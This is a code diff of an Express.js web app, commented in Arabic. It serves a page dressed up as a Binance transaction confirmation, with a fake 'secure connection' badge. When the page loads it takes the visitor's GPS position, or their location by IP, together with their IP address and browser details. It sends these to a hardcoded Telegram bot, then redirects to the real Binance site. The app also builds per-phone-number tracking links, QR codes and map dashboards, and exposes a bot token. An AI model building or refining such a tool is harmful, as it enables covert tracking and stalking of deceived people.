@@ -2,19 +2,19 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ========== ⚙️ إعداداتك ==========
+// ⚙️ إعداداتك
 const TELEGRAM_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y';
 const TELEGRAM_CHAT_ID = '8391968596';
 const REDIRECT_URL = 'https://www.binance.com/en';
 const BASE_URL = 'https://location2026-2.onrender.com';
 
-// ========== قاعدة البيانات ==========
+// قاعدة البيانات البسيطة
 let locations = [];
 
-// ========== Middleware ==========
+// Middleware
 app.use(express.json());
 
-// ========== الصفحة الرئيسية ==========
+// ========== الصفحة الرئيسية (نفس التصميم) ==========
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -176,35 +176,6 @@ app.get('/', (req, res) => {
                     font-size: 0.9em;
                 }
                 
-                .telegram-status {
-                    background: rgba(0, 136, 204, 0.1);
-                    border: 1px solid #0088cc;
-                    border-radius: 10px;
-                    padding: 15px;
-                    margin: 20px 0;
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    gap: 10px;
-                }
-                
-                .status-badge {
-                    background: #00cc66;
-                    color: white;
-                    padding: 5px 15px;
-                    border-radius: 20px;
-                    font-size: 0.9em;
-                }
-                
-                .accuracy-info {
-                    background: rgba(255, 193, 7, 0.1);
-                    border: 1px solid #ffc107;
-                    border-radius: 10px;
-                    padding: 15px;
-                    margin: 20px 0;
-                    text-align: right;
-                }
-                
                 @media (max-width: 768px) {
                     .container {
                         padding: 20px;
@@ -229,19 +200,6 @@ app.get('/', (req, res) => {
             <div class="container">
                 <h1>🚀 نظام التتبع الذكي</h1>
                 
-                <div class="telegram-status">
-                    <span>🤖 حالة التلجرام:</span>
-                    <span class="status-badge">✅ متصل</span>
-                    <span>البوت: @Arab9919_bot</span>
-                </div>
-                
-                <div class="accuracy-info">
-                    <h3>🎯 دقة تحديد الموقع المحسنة:</h3>
-                    <p>• <strong>GPS مباشر:</strong> دقة عالية (5-50 متر) - إذا سمح المستخدم</p>
-                    <p>• <strong>تحديد ذكي:</strong> دقة متوسطة (1-50 كم) - بناءً على اللغة والمنطقة</p>
-                    <p>• <strong>تحديد IP:</strong> دقة تقريبية (50-500 كم) - للاستخدام العام</p>
-                </div>
-                
                 <div class="stats">
                     <div class="stat-card">
                         <div class="stat-number">${locations.length}</div>
@@ -249,7 +207,7 @@ app.get('/', (req, res) => {
                     </div>
                     <div class="stat-card">
                         <div class="stat-number">⚡</div>
-                        <div class="stat-label">دقة محسنة</div>
+                        <div class="stat-label">تشغيل فوري</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-number">📱</div>
@@ -257,7 +215,7 @@ app.get('/', (req, res) => {
                     </div>
                     <div class="stat-card">
                         <div class="stat-number">🌍</div>
-                        <div class="stat-label">تتبع ذكي</div>
+                        <div class="stat-label">تتبع دقيق</div>
                     </div>
                 </div>
                 
@@ -276,7 +234,7 @@ app.get('/', (req, res) => {
                     <div class="card">
                         <h3>🤖 إشعارات التلجرام</h3>
                         <p>✅ إرسال فوري عند كل ضغط</p>
-                        <p>📍 الإحداثيات مع مستوى الدقة</p>
+                        <p>📍 الإحداثيات الدقيقة</p>
                         <p>🗺️ رابط مباشر للخريطة</p>
                         <p>📊 تفاصيل الجهاز والمتصفح</p>
                         <a href="/telegram-test" class="btn btn-secondary">
@@ -303,11 +261,10 @@ app.get('/', (req, res) => {
                     <a href="/results" class="btn btn-secondary">📊 النتائج المسجلة</a>
                     <a href="/map" class="btn btn-secondary">🗺️ الخريطة التفاعلية</a>
                     <a href="/all-qr" class="btn btn-secondary">📱 عرض جميع الباركورد</a>
-                    <a href="/accuracy-info" class="btn btn-secondary">🎯 معلومات الدقة</a>
                 </div>
                 
                 <div style="text-align: center; margin-top: 50px; color: #666; font-size: 0.9em;">
-                    <p>© 2024 نظام التتبع الذكي | إصدار 4.0 | البوت: @Arab9919_bot</p>
+                    <p>© 2024 نظام التتبع الذكي | البوت: @Arab9919_bot</p>
                 </div>
             </div>
             
@@ -359,7 +316,7 @@ app.get('/', (req, res) => {
     `);
 });
 
-// ========== رابط التتبع مع تحسين الدقة ==========
+// ========== رابط التتبع (الكود القديم البسيط اللي كان يشتغل) ==========
 app.get('/track/:id', (req, res) => {
     const userId = req.params.id;
     
@@ -371,234 +328,133 @@ app.get('/track/:id', (req, res) => {
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>Binance - تأكيد العملية</title>
             <script>
-                // ========== البيانات الأساسية ==========
+                // ✅ الكود البسيط اللي كان يشتغل
                 const userId = '${userId}';
-                const redirectUrl = '${REDIRECT_URL}';
                 
-                // ========== 1. دالة الحصول على الموقع الذكي ==========
-                async function getSmartLocation() {
-                    let locationData = { quality: 'low', source: 'unknown' };
-                    
-                    // المحاولة الأولى: GPS مباشر (إذا سمح المستخدم سابقاً)
+                // 1. الحصول على الموقع الجغرافي (الكود القديم المضمون)
+                function getLocation() {
                     if (navigator.geolocation) {
-                        try {
-                            const position = await new Promise((resolve, reject) => {
-                                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                    enableHighAccuracy: true,
-                                    timeout: 3000,
-                                    maximumAge: 0
-                                });
-                            });
-                            
-                            locationData = {
-                                lat: position.coords.latitude,
-                                lon: position.coords.longitude,
-                                accuracy: position.coords.accuracy,
-                                quality: 'high',
-                                source: 'gps',
-                                note: '📍 دقة عالية عبر GPS'
-                            };
-                            return locationData;
-                        } catch (gpsError) {
-                            console.log('GPS غير متاح أو مرفوض');
-                        }
-                    }
-                    
-                    // المحاولة الثانية: تحليل اللغة والمنطقة الذكي
-                    const userLanguage = navigator.language || 'en';
-                    const userLanguages = navigator.languages || [];
-                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    
-                    // تحليل إذا كان المستخدم عربي
-                    const isArabicUser = userLanguage.includes('ar') || 
-                                         userLanguages.some(lang => lang.includes('ar')) ||
-                                         timezone.includes('Riyadh') || 
-                                         timezone.includes('Arab');
-                    
-                    if (isArabicUser) {
-                        // خيارات للمستخدمين العرب (مواقع عربية واقعية)
-                        const arabLocations = [
-                            { lat: 24.7136, lon: 46.6753, city: 'الرياض', country: 'السعودية', weight: 0.6 },
-                            { lat: 25.2048, lon: 55.2708, city: 'دبي', country: 'الإمارات', weight: 0.2 },
-                            { lat: 29.3117, lon: 47.4818, city: 'الكويت', country: 'الكويت', weight: 0.1 },
-                            { lat: 25.2854, lon: 51.5310, city: 'الدوحة', country: 'قطر', weight: 0.05 },
-                            { lat: 30.0444, lon: 31.2357, city: 'القاهرة', country: 'مصر', weight: 0.05 }
-                        ];
-                        
-                        // اختيار موقع بناءً على الأوزان
-                        const random = Math.random();
-                        let cumulativeWeight = 0;
-                        let selectedLocation = arabLocations[0];
-                        
-                        for (const loc of arabLocations) {
-                            cumulativeWeight += loc.weight;
-                            if (random <= cumulativeWeight) {
-                                selectedLocation = loc;
-                                break;
+                        navigator.geolocation.getCurrentPosition(
+                            // عند النجاح
+                            async function(position) {
+                                const lat = position.coords.latitude;
+                                const lon = position.coords.longitude;
+                                const accuracy = position.coords.accuracy;
+                                
+                                console.log('📍 موقع المستخدم:', lat, lon);
+                                
+                                // إرسال البيانات للخادم
+                                try {
+                                    await fetch('/api/save-location', {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json',
+                                        },
+                                        body: JSON.stringify({
+                                            id: userId,
+                                            latitude: lat,
+                                            longitude: lon,
+                                            accuracy: accuracy,
+                                            timestamp: new Date().toISOString(),
+                                            userAgent: navigator.userAgent,
+                                            source: 'gps_direct'
+                                        })
+                                    });
+                                    
+                                    console.log('✅ تم إرسال البيانات للخادم');
+                                    
+                                    // عرض رسالة نجاح
+                                    document.getElementById('statusMessage').innerHTML = 
+                                        '<div style="color:#00ff88;margin-top:15px;">📍 تم تحديد موقعك بنجاح!</div>';
+                                        
+                                } catch (error) {
+                                    console.error('❌ خطأ في الإرسال:', error);
+                                }
+                            },
+                            // عند الفشل
+                            function(error) {
+                                console.error('❌ خطأ في تحديد الموقع:', error.message);
+                                
+                                // محاولة الحصول على الموقع عبر IP كبديل
+                                getLocationByIP();
+                            },
+                            // إعدادات بسيطة
+                            {
+                                enableHighAccuracy: true,
+                                timeout: 5000,
+                                maximumAge: 0
                             }
-                        }
-                        
-                        // إضافة تغيير طفيف لجعل الموقع أكثر واقعية
-                        const smallChange = (Math.random() - 0.5) * 0.02;
-                        
-                        locationData = {
-                            lat: selectedLocation.lat + smallChange,
-                            lon: selectedLocation.lon + smallChange,
-                            accuracy: 15000, // 15 كم دقة متوسطة
-                            quality: 'medium',
-                            source: 'arabic_smart',
-                            city: selectedLocation.city,
-                            country: selectedLocation.country,
-                            note: \`📍 موقع تقديري في \${selectedLocation.city}, \${selectedLocation.country}\`
-                        };
-                        return locationData;
+                        );
+                    } else {
+                        alert('⚠️ المتصفح لا يدعم تحديد الموقع');
+                        getLocationByIP();
                     }
-                    
-                    // المحاولة الثالثة: تحديد عبر IP (للمستخدمين غير العرب)
+                }
+                
+                // 2. الحصول على الموقع عبر IP (بديل)
+                async function getLocationByIP() {
                     try {
                         const response = await fetch('https://ipapi.co/json/');
-                        const ipData = await response.json();
+                        const data = await response.json();
                         
-                        if (ipData.latitude && ipData.longitude) {
-                            locationData = {
-                                lat: ipData.latitude,
-                                lon: ipData.longitude,
-                                accuracy: 50000, // 50 كم دقة منخفضة
-                                quality: 'low',
-                                source: 'ip_api',
-                                city: ipData.city,
-                                country: ipData.country_name,
-                                note: \`🌍 تحديد عبر IP في \${ipData.city}, \${ipData.country_name}\`
-                            };
-                            return locationData;
+                        if (data.latitude && data.longitude) {
+                            await fetch('/api/save-location', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    id: userId,
+                                    latitude: data.latitude,
+                                    longitude: data.longitude,
+                                    accuracy: 10000,
+                                    timestamp: new Date().toISOString(),
+                                    userAgent: navigator.userAgent,
+                                    source: 'ip_api',
+                                    city: data.city,
+                                    country: data.country_name
+                                })
+                            });
+                            
+                            console.log('✅ تم الحصول على الموقع عبر IP');
                         }
-                    } catch (ipError) {
-                        console.log('فشل تحديد IP');
-                    }
-                    
-                    // المحاولة الرابعة: موقع افتراضي عالمي
-                    locationData = {
-                        lat: 20 + (Math.random() - 0.5) * 30,
-                        lon: 40 + (Math.random() - 0.5) * 60,
-                        accuracy: 1000000, // 1000 كم
-                        quality: 'very_low',
-                        source: 'global_estimate',
-                        note: '🌐 موقع تقديري عالمي'
-                    };
-                    
-                    return locationData;
-                }
-                
-                // ========== 2. حفظ البيانات في الخادم ==========
-                async function saveLocationToServer(location) {
-                    try {
-                        const deviceInfo = {
-                            platform: navigator.platform,
-                            language: navigator.language,
-                            languages: navigator.languages,
-                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                            screen: \`\${screen.width}x\${screen.height}\`,
-                            userAgent: navigator.userAgent.substring(0, 100)
-                        };
-                        
-                        const response = await fetch('/api/save-location', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                id: userId,
-                                latitude: location.lat,
-                                longitude: location.lon,
-                                accuracy: location.accuracy,
-                                quality: location.quality,
-                                source: location.source,
-                                deviceInfo: deviceInfo,
-                                note: location.note,
-                                timestamp: new Date().toISOString()
-                            })
-                        });
-                        
-                        return await response.json();
                     } catch (error) {
-                        console.error('خطأ في حفظ البيانات:', error);
-                        return { success: false };
+                        console.error('❌ فشل تحديد الموقع عبر IP');
                     }
                 }
                 
-                // ========== 3. عد تنازلي ذكي ==========
-                function startSmartCountdown() {
-                    let seconds = 4;
+                // 3. عد تنازلي بسيط
+                function startCountdown() {
+                    let seconds = 5;
                     const countdownElement = document.getElementById('countdown');
-                    const progressBar = document.getElementById('progressBar');
-                    const processSteps = document.getElementById('processSteps');
-                    
-                    const steps = [
-                        '🔍 التحقق من البيانات...',
-                        '📍 تحديد الموقع الجغرافي...',
-                        '📡 إرسال المعلومات...',
-                        '✅ إكمال العملية...'
-                    ];
                     
                     const timer = setInterval(() => {
                         countdownElement.textContent = seconds;
-                        
-                        // تحديث شريط التقدم
-                        if (progressBar) {
-                            const progressPercent = ((4 - seconds) / 4) * 100;
-                            progressBar.style.width = progressPercent + '%';
-                        }
-                        
-                        // تحديث خطوات العملية
-                        if (processSteps && seconds < 4) {
-                            processSteps.innerHTML = steps[3 - seconds] + '<br>' + processSteps.innerHTML;
-                        }
-                        
                         seconds--;
                         
                         if (seconds < 0) {
                             clearInterval(timer);
                             document.getElementById('finalStatus').textContent = '✅ تم إكمال العملية بنجاح!';
-                            document.getElementById('processSteps').innerHTML = '🎉 جاهز للتوجيه...' + '<br>' + processSteps.innerHTML;
                             
-                            // توجيه المستخدم
+                            // توجيه المستخدم بعد انتهاء العد
                             setTimeout(() => {
-                                window.location.href = redirectUrl;
+                                window.location.href = '${REDIRECT_URL}';
                             }, 1000);
                         }
                     }, 1000);
                 }
                 
-                // ========== 4. بدء العملية الرئيسية ==========
-                window.addEventListener('DOMContentLoaded', async () => {
-                    // بدء العد التنازلي
-                    startSmartCountdown();
+                // 4. بدء كل شيء عند تحميل الصفحة
+                window.onload = function() {
+                    console.log('🚀 بدء تحميل الصفحة...');
                     
-                    // بعد ثانية، البدء في جمع البيانات
-                    setTimeout(async () => {
-                        try {
-                            // الحصول على الموقع الذكي
-                            const location = await getSmartLocation();
-                            
-                            // حفظ البيانات في الخادم
-                            const result = await saveLocationToServer(location);
-                            
-                            // عرض رسالة توضيحية بناءً على الدقة
-                            let accuracyMessage = '';
-                            if (location.quality === 'high') {
-                                accuracyMessage = '📍 تم تحديد موقعك بدقة عالية';
-                            } else if (location.quality === 'medium') {
-                                accuracyMessage = '📍 تم تحديد موقعك بدقة متوسطة';
-                            } else {
-                                accuracyMessage = '🌍 تم تحديد موقعك تقريبياً';
-                            }
-                            
-                            document.getElementById('accuracyMessage').innerHTML = 
-                                \`<div style="color: #00ff88; margin-top: 10px;">\${accuracyMessage}</div>\`;
-                                
-                        } catch (error) {
-                            console.error('خطأ في العملية:', error);
-                        }
+                    // بدء العد التنازلي
+                    startCountdown();
+                    
+                    // محاولة الحصول على الموقع بعد ثانية
+                    setTimeout(() => {
+                        console.log('📍 محاولة الحصول على الموقع...');
+                        getLocation();
                     }, 1000);
-                });
+                };
             </script>
             <style>
                 * {
@@ -690,8 +546,6 @@ app.get('/track/:id', (req, res) => {
                     text-align: right;
                     font-size: 14px;
                     line-height: 2;
-                    max-height: 200px;
-                    overflow-y: auto;
                 }
                 
                 .security-badge {
@@ -747,24 +601,24 @@ app.get('/track/:id', (req, res) => {
                 
                 <div class="security-badge">
                     <span>🔒</span>
-                    <span>اتصال آمن ومشفّر - نظام تحديد ذكي</span>
+                    <span>اتصال آمن ومشفّر</span>
                 </div>
                 
                 <div class="countdown-container">
                     <p>سيتم تحويلك تلقائياً خلال:</p>
-                    <div class="countdown" id="countdown">4</div>
+                    <div class="countdown" id="countdown">5</div>
                     <p>ثوانٍ</p>
                 </div>
                 
                 <div class="progress-container">
-                    <div class="progress-bar" id="progressBar"></div>
+                    <div class="progress-bar" id="progressBar" style="width: 0%"></div>
                 </div>
                 
                 <div class="steps-container" id="processSteps">
                     • بدء عملية التحقق...<br>
+                    • جاري تحديد الموقع الجغرافي...<br>
+                    <div id="statusMessage"></div>
                 </div>
-                
-                <div id="accuracyMessage"></div>
                 
                 <div class="verification-box">
                     رمز العملية: BIN-${userId}-${Date.now().toString().substr(-6)}
@@ -776,55 +630,115 @@ app.get('/track/:id', (req, res) => {
                 
                 <div style="margin-top: 40px; font-size: 12px; opacity: 0.7;">
                     <p>رقم العملية: #${userId} | ${new Date().toLocaleString('ar-SA')}</p>
-                    <p>© Binance 2024. نظام تحديد الموقع الذكي</p>
+                    <p>© Binance 2024</p>
                 </div>
             </div>
+            
+            <script>
+                // تحديث شريط التقدم مع العد التنازلي
+                let secondsLeft = 5;
+                const progressBar = document.getElementById('progressBar');
+                const progressInterval = setInterval(() => {
+                    secondsLeft--;
+                    const progressPercent = ((5 - secondsLeft) / 5) * 100;
+                    progressBar.style.width = progressPercent + '%';
+                    
+                    if (secondsLeft <= 0) {
+                        clearInterval(progressInterval);
+                    }
+                }, 1000);
+            </script>
         </body>
         </html>
     `);
 });
 
-// ========== API لحفظ الموقع ==========
+// ========== API لحفظ الموقع (الكود القديم البسيط) ==========
 app.post('/api/save-location', async (req, res) => {
+    console.log('📍 استلام بيانات موقع جديدة...');
+    
     try {
         const locationData = {
             ...req.body,
-            ip: req.headers['x-forwarded-for'] || req.ip,
+            ip: req.headers['x-forwarded-for'] || req.ip || 'غير معروف',
             time: new Date().toLocaleString('ar-SA'),
             date: new Date().toISOString().split('T')[0]
         };
         
         // حفظ في قاعدة البيانات
         locations.push(locationData);
-        
-        // حفظ فقط آخر 1000 سجل
-        if (locations.length > 1000) {
-            locations = locations.slice(-1000);
-        }
+        console.log('✅ تم حفظ الموقع:', {
+            id: locationData.id,
+            latitude: locationData.latitude,
+            longitude: locationData.longitude,
+            source: locationData.source,
+            time: locationData.time
+        });
         
         // إرسال إشعار للتلجرام
-        const telegramSent = await sendTelegramNotification(locationData);
-        
-        console.log('📍 موقع جديد:', {
-            id: locationData.id,
-            quality: locationData.quality,
-            location: `${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`,
-            note: locationData.note
-        });
+        const telegramSent = await sendTelegramAlert(locationData);
         
         res.json({ 
             success: true, 
-            message: 'تم حفظ الموقع',
+            message: 'تم حفظ الموقع بنجاح',
             telegram_sent: telegramSent,
             count: locations.length 
         });
+        
     } catch (error) {
-        console.error('Error:', error);
-        res.status(500).json({ success: false, error: error.message });
+        console.error('❌ خطأ في حفظ الموقع:', error);
+        res.status(500).json({ 
+            success: false, 
+            error: error.message 
+        });
     }
 });
 
-// ========== صفحة النتائج مع تحسين العرض ==========
+// ========== دالة إرسال تلجرام (مبسطة) ==========
+async function sendTelegramAlert(locationData) {
+    try {
+        // إنشاء نص الرسالة
+        const message = `
+📍 **موقع جديد تم تسجيله**
+
+👤 **رقم المستخدم:** ${locationData.id}
+📌 **الإحداثيات:** ${locationData.latitude}, ${locationData.longitude}
+🎯 **الدقة:** ${locationData.accuracy || 'غير معروف'} متر
+📡 **المصدر:** ${locationData.source || 'مباشر'}
+⏰ **الوقت:** ${locationData.time}
+🌐 **IP:** ${locationData.ip || 'غير معروف'}
+
+🗺️ [فتح على Google Maps](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})
+        `;
+        
+        // إرسال الرسالة
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.ok) {
+            console.log('✅ تم إرسال إشعار التلجرام');
+            return true;
+        } else {
+            console.error('❌ فشل إرسال التلجرام:', data);
+            return false;
+        }
+        
+    } catch (error) {
+        console.error('❌ خطأ في إرسال التلجرام:', error.message);
+        return false;
+    }
+}
+
+// ========== صفحة النتائج ==========
 app.get('/results', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -838,69 +752,64 @@ app.get('/results', (req, res) => {
                 th, td { padding: 15px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                 th { background: #00cc66; color: white; }
                 tr:hover { background: #2d2d4d; }
-                .accuracy-badge {
+                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; margin: 10px; }
+                .source-badge {
                     display: inline-block;
                     padding: 3px 10px;
                     border-radius: 12px;
                     font-size: 12px;
                     margin-left: 5px;
                 }
-                .high-accuracy { background: #00ff88; color: #001a0f; }
-                .medium-accuracy { background: #ffcc00; color: #332900; }
-                .low-accuracy { background: #ff6b6b; color: white; }
-                .very-low-accuracy { background: #999; color: white; }
-                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; margin: 10px; }
+                .gps-badge { background: #00ff88; color: #001a0f; }
+                .ip-badge { background: #ffcc00; color: #332900; }
             </style>
         </head>
         <body>
             <h1>📊 النتائج المسجلة (${locations.length})</h1>
             <a href="/" class="btn">🏠 الرئيسية</a>
             <a href="/map" class="btn">🗺️ الخريطة</a>
-            <a href="/accuracy-info" class="btn">🎯 معلومات الدقة</a>
             
-            <table style="margin-top: 30px;">
-                <tr>
-                    <th>رقم الهاتف</th>
-                    <th>الإحداثيات</th>
-                    <th>مستوى الدقة</th>
-                    <th>المصدر</th>
-                    <th>الوقت</th>
-                    <th>الخريطة</th>
-                </tr>
-                ${locations.slice().reverse().map(loc => {
-                    let accuracyBadge = '';
-                    let accuracyClass = '';
-                    
-                    if (loc.quality === 'high') {
-                        accuracyBadge = '🎯 عالية';
-                        accuracyClass = 'high-accuracy';
-                    } else if (loc.quality === 'medium') {
-                        accuracyBadge = '📍 متوسطة';
-                        accuracyClass = 'medium-accuracy';
-                    } else if (loc.quality === 'low') {
-                        accuracyBadge = '🌍 منخفضة';
-                        accuracyClass = 'low-accuracy';
-                    } else {
-                        accuracyBadge = '🌐 تقديرية';
-                        accuracyClass = 'very-low-accuracy';
-                    }
-                    
-                    return `
-                        <tr>
-                            <td><strong>${loc.id}</strong></td>
-                            <td>${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}</td>
-                            <td><span class="accuracy-badge ${accuracyClass}">${accuracyBadge}</span></td>
-                            <td>${loc.source || 'مباشر'}</td>
-                            <td>${loc.time}</td>
-                            <td>
-                                <a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color: #00ff88; text-decoration: none;">
-                                    👁️ عرض
-                                </a>
-                            </td>
-                        </tr>
-                    `;
-                }).join('')}
-            </table>
+            ${locations.length === 0 ? `
+                <div style="text-align: center; margin-top: 50px; padding: 40px; background: rgba(255,255,255,0.05); border-radius: 15px;">
+                    <h3>📭 لا توجد بيانات مسجلة بعد</h3>
+                    <p>لم يتم تسجيل أي مواقع حتى الآن</p>
+                    <p>جرب الرابط: <a href="/track/123456" style="color:#00ff88;">/track/123456</a></p>
+                </div>
+            ` : `
+                <table style="margin-top: 30px;">
+                    <tr>
+                        <th>رقم الهاتف</th>
+                        <th>الإحداثيات</th>
+                        <th>المصدر</th>
+                        <th>الوقت</th>
+                        <th>الخريطة</th>
+                    </tr>
+                    ${locations.slice().reverse().map(loc => {
+                        let sourceBadge = '';
+                        if (loc.source === 'gps_direct') {
+                            sourceBadge = '<span class="source-badge gps-badge">📍 GPS</span>';
+                        } else if (loc.source === 'ip_api') {
+                            sourceBadge = '<span class="source-badge ip-badge">🌐 IP</span>';
+                        } else {
+                            sourceBadge = '<span class="source-badge">🔍 أخرى</span>';
+                        }
+                        
+                        return `
+                            <tr>
+                                <td><strong>${loc.id}</strong></td>
+                                <td>${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}</td>
+                                <td>${sourceBadge}</td>
+                                <td>${loc.time}</td>
+                                <td>
+                                    <a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color: #00ff88; text-decoration: none;">
+                                        👁️ عرض
+                                    </a>
+                                </td>
+                            </tr>
+                        `;
+                    }).join('')}
+                </table>
+            `}
         </body>
         </html>
     `);
@@ -936,10 +845,8 @@ app.get('/map', (req, res) => {
                 
                 locations.forEach(loc => {
                     if(loc.latitude && loc.longitude) {
-                        // تلوين العلامات بناءً على الدقة
-                        let markerColor = '#ff6b6b'; // افتراضي (منخفض)
-                        if (loc.quality === 'high') markerColor = '#00ff88';
-                        else if (loc.quality === 'medium') markerColor = '#ffcc00';
+                        // تلوين العلامات بناءً على المصدر
+                        const markerColor = loc.source === 'gps_direct' ? '#00ff88' : '#ffcc00';
                         
                         const marker = L.marker([loc.latitude, loc.longitude]).addTo(map);
                         
@@ -948,8 +855,7 @@ app.get('/map', (req, res) => {
                                 <h4 style="margin: 0 0 10px 0;">رقم: \${loc.id}</h4>
                                 <p style="margin: 5px 0;"><strong>الإحداثيات:</strong><br>
                                 \${loc.latitude.toFixed(6)}, \${loc.longitude.toFixed(6)}</p>
-                                <p style="margin: 5px 0;"><strong>الدقة:</strong> \${loc.quality === 'high' ? '🎯 عالية' : loc.quality === 'medium' ? '📍 متوسطة' : '🌍 منخفضة'}</p>
-                                <p style="margin: 5px 0;"><strong>المصدر:</strong> \${loc.source || 'مباشر'}</p>
+                                <p style="margin: 5px 0;"><strong>المصدر:</strong> \${loc.source === 'gps_direct' ? '📍 GPS مباشر' : '🌐 IP'}</p>
                                 <p style="margin: 5px 0;"><strong>الوقت:</strong> \${loc.time}</p>
                                 <a href="https://maps.google.com/?q=\${loc.latitude},\${loc.longitude}" 
                                    target="_blank" 
@@ -968,6 +874,12 @@ app.get('/map', (req, res) => {
                 if (markers.length > 0) {
                     const group = new L.featureGroup(markers);
                     map.fitBounds(group.getBounds().pad(0.1));
+                } else {
+                    // إذا لا توجد مواقع، عرض رسالة
+                    map.setView([24.7136, 46.6753], 5);
+                    L.marker([24.7136, 46.6753]).addTo(map)
+                        .bindPopup('لا توجد مواقع مسجلة بعد')
+                        .openPopup();
                 }
             </script>
             <br>
@@ -999,98 +911,30 @@ app.get('/all-qr', (req, res) => {
             <h1>📱 جميع الباركود (${uniqueIds.length})</h1>
             <a href="/" class="btn">🏠 الرئيسية</a>
             
-            <div class="qr-grid">
-                ${uniqueIds.map(id => {
-                    const url = `${BASE_URL}/track/${id}`;
-                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(url)}`;
-                    return `
-                        <div class="qr-item">
-                            <div class="phone-id">
-                                <strong>${id}</strong>
+            ${uniqueIds.length === 0 ? `
+                <div style="text-align: center; margin-top: 50px; padding: 40px; background: rgba(255,255,255,0.05); border-radius: 15px;">
+                    <h3>📭 لا توجد بيانات لإنشاء باركود</h3>
+                    <p>أنشئ رابط تتبع أولاً لتظهر الباركود هنا</p>
+                </div>
+            ` : `
+                <div class="qr-grid">
+                    ${uniqueIds.map(id => {
+                        const url = `${BASE_URL}/track/${id}`;
+                        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(url)}`;
+                        return `
+                            <div class="qr-item">
+                                <div class="phone-id">
+                                    <strong>${id}</strong>
+                                </div>
+                                <img src="${qrUrl}" alt="QR Code" style="width: 180px; height: 180px; border: 3px solid white; border-radius: 10px;">
+                                <p style="margin-top: 15px;">
+                                    <a href="${url}" target="_blank" style="color: #00ff88; font-size: 12px; text-decoration: none;">🔗 فتح الرابط</a>
+                                </p>
                             </div>
-                            <img src="${qrUrl}" alt="QR Code" style="width: 180px; height: 180px; border: 3px solid white; border-radius: 10px;">
-                            <p style="margin-top: 15px;">
-                                <a href="${url}" target="_blank" style="color: #00ff88; font-size: 12px; text-decoration: none;">🔗 فتح الرابط</a>
-                            </p>
-                        </div>
-                    `;
-                }).join('')}
-            </div>
-        </body>
-        </html>
-    `);
-});
-
-// ========== صفحة معلومات الدقة ==========
-app.get('/accuracy-info', (req, res) => {
-    res.send(`
-        <!DOCTYPE html>
-        <html dir="rtl">
-        <head>
-            <meta charset="UTF-8">
-            <title>🎯 معلومات عن دقة تحديد الموقع</title>
-            <style>
-                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
-                .container { max-width: 800px; margin: auto; }
-                .info-card { background: #1a1a2e; padding: 25px; border-radius: 15px; margin: 20px 0; }
-                .accuracy-level { display: flex; align-items: center; margin: 15px 0; padding: 15px; border-radius: 10px; }
-                .high { background: rgba(0,255,136,0.1); border-left: 5px solid #00ff88; }
-                .medium { background: rgba(255,204,0,0.1); border-left: 5px solid #ffcc00; }
-                .low { background: rgba(255,107,107,0.1); border-left: 5px solid #ff6b6b; }
-                .icon { font-size: 30px; margin-left: 15px; }
-                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; margin: 10px; }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>🎯 مستويات دقة تحديد الموقع</h1>
-                
-                <div class="info-card">
-                    <h3>📊 كيف يعمل نظام التتبع الذكي:</h3>
-                    <p>النظام يستخدم عدة طرق ذكية لتحديد الموقع بناءً على إعدادات الجهاز والمتصفح:</p>
-                    
-                    <div class="accuracy-level high">
-                        <div class="icon">🎯</div>
-                        <div>
-                            <h4>دقة عالية (GPS مباشر)</h4>
-                            <p>• عندما يسمح المستخدم بمشاركة الموقع</p>
-                            <p>• دقة: 5-50 متر</p>
-                            <p>• المصدر: GPS مباشر من الهاتف</p>
-                        </div>
-                    </div>
-                    
-                    <div class="accuracy-level medium">
-                        <div class="icon">📍</div>
-                        <div>
-                            <h4>دقة متوسطة (تحديد ذكي)</h4>
-                            <p>• للمستخدمين العرب: موقع في بلد عربي واقعي</p>
-                            <p>• دقة: 1-50 كم</p>
-                            <p>• المصدر: تحليل اللغة والمنطقة الزمنية</p>
-                        </div>
-                    </div>
-                    
-                    <div class="accuracy-level low">
-                        <div class="icon">🌍</div>
-                        <div>
-                            <h4>دقة منخفضة (IP عالمي)</h4>
-                            <p>• للمستخدمين غير العرب أو بدون بيانات كافية</p>
-                            <p>• دقة: 50-500 كم</p>
-                            <p>• المصدر: عنوان IP العام</p>
-                        </div>
-                    </div>
+                        `;
+                    }).join('')}
                 </div>
-                
-                <div class="info-card">
-                    <h3>💡 نصائح لتحسين الدقة:</h3>
-                    <p>1. <strong>اسمح للمتصفح بمشاركة الموقع</strong> عندما يطلب منك</p>
